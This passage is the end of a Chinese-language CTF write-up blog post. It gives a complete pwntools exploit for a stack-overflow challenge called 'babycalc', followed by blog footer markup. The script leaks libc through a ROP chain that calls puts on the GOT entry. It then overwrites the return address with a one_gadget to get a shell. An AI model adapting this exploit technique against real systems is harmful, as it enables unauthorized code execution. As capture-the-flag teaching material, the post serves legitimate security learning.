+<p>完整 exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./babycalc&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x400C80</span></span><br><span class="line">csu_end_addr=<span class="number">0x400C9A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        p = process(challenge)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;tcp.cloud.dasctf.com&#x27;</span>, <span class="string">&#x27;22084&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">        gdb.attach(p,<span class="string">&quot;b*0x4007F0\n b*0x400BA6\n b*0x40079B\n&quot;</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">    v3 = [<span class="number">19</span>, <span class="number">36</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">17</span>, <span class="number">161</span>, <span class="number">50</span>, <span class="number">131</span>, <span class="number">212</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">199</span>, <span class="number">24</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0x0000000000400ca3</span></span><br><span class="line">    pop_rsi_ret = <span class="number">0x0000000000400ca1</span></span><br><span class="line">    puts_got = <span class="number">0x602018</span></span><br><span class="line">    puts_plt = <span class="number">0x4005d0</span></span><br><span class="line">    read_plt = <span class="number">0x4005F0</span></span><br><span class="line">    main_addr = <span class="number">0x400C1A</span></span><br><span class="line">    pwn_addr = <span class="number">0x400789</span></span><br><span class="line">    start_addr = <span class="number">0x400650</span></span><br><span class="line"></span><br><span class="line">    code = p64(<span class="number">1</span>)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">    payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+code.ljust(<span class="number">0x60</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;good done\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    puts_libc = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base = puts_libc - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    success(<span class="string">&quot;puts_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(puts_libc))</span><br><span class="line">    success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    debug()</span><br><span class="line"></span><br><span class="line">    system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="number">0x18ce57</span></span><br><span class="line"></span><br><span class="line">    one_gadgets = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">    one_gadget = one_gadgets[<span class="number">3</span>]+libc_base</span><br><span class="line"></span><br><span class="line">    success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line">    success(<span class="string">&quot;binsh_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;24&#x27;</span>+<span class="string">&#x27;d&#x27;</span>*(<span class="number">0x70</span>-<span class="number">2</span>)+<span class="number">0x58</span>*<span class="string">&quot;e&quot;</span>+p64(one_gadget)</span><br><span class="line">    payload += p8(v3[<span class="number">0</span>])+p8(v3[<span class="number">1</span>])+p8(v3[<span class="number">2</span>])+p8(v3[<span class="number">3</span>])+p8(v3[<span class="number">4</span>])+p8(v3[<span class="number">5</span>])+p8(v3[<span class="number">6</span>])+p8(v3[<span class="number">7</span>])+p8(v3[<span class="number">8</span>])+p8(v3[<span class="number">9</span>])+p8(v3[<span class="number">10</span>])+p8(v3[<span class="number">11</span>])+p8(v3[<span class="number">12</span>])+p8(v3[<span class="number">13</span>])+p8(v3[<span class="number">14</span>])+p8(v3[<span class="number">15</span>])</span><br><span class="line">    payload += <span class="string">&#x27;f&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(<span class="number">0x38</span>) </span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&quot;number-1:&quot;</span>,payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        success(<span class="string">&quot;&gt;&gt; testing&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/stack/" rel="tag"><i class="fa fa-tag"></i> stack</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/01/userfaultfd+setxattr+pt_regs/" rel="prev" title="userfaultfd+setxattr+pt_regs">
+      <i class="fa fa-chevron-left"></i> userfaultfd+setxattr+pt_regs
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">210</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">127</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">2.8m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">42:23</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
